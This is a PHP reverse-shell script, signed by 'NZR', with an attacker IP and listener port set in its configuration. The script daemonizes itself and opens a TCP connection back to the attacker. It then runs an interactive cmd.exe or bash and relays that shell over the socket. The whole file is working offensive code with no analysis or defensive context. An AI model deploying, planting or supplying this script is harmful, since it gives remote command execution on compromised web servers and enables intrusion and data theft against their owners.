<?php
// WRITTEN AND MAINTAINED BY NZR

// ========== CONFIGURATION ==========
$allowed_hosts = ['192.168.1.1'];  // Attacker IP(s)
$remote_host   = '192.168.1.1';    // Attacker IP
$remote_port   = 443;                  // Listener port (TCP or SSL)
$timeout       = 10;

// ========== SANITY CHECK ==========
$client_ip = gethostbyname(gethostname());
if (!in_array($remote_host, $allowed_hosts)) {
    exit;
}

// ========== DETERMINE SHELL ==========
$os = strtoupper(substr(PHP_OS, 0, 3));
$shell_cmd = ($os === 'WIN') ? 'cmd.exe' : '/bin/bash -i';

// ========== FORK (DAEMONIZE) ==========
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid === -1) exit;
    if ($pid > 0) exit;
    posix_setsid();
}

// ========== CONNECT BACK ==========
$socket = stream_socket_client("tcp://$remote_host:$remote_port", $errno, $errstr, $timeout);
if (!$socket) exit;
stream_set_blocking($socket, false);

// ========== LAUNCH SHELL ==========
$descriptors = [
    0 => ['pipe', 'r'], // STDIN
    1 => ['pipe', 'w'], // STDOUT
    2 => ['pipe', 'w']  // STDERR
];
$process = proc_open($shell_cmd, $descriptors, $pipes);
if (!is_resource($process)) {
    fclose($socket);
    exit;
}
foreach ($pipes as $p) stream_set_blocking($p, false);

// ========== MAIN LOOP ==========
while (!feof($socket) && !feof($pipes[1])) {
    $read = [$socket, $pipes[1], $pipes[2]];
    $write = $except = null;

    if (stream_select($read, $write, $except, 0) === false) break;

    foreach ($read as $r) {
        if ($r === $socket) {
            $in = fread($socket, 2048);
            if ($in === false) break 2;
            fwrite($pipes[0], $in);
        } else {
            $out = fread($r, 2048);
            if ($out === false) break 2;
            fwrite($socket, $out);
        }
    }
}

// ========== CLEANUP ==========
fclose($socket);
foreach ($pipes as $p) fclose($p);
proc_close($process);
?>
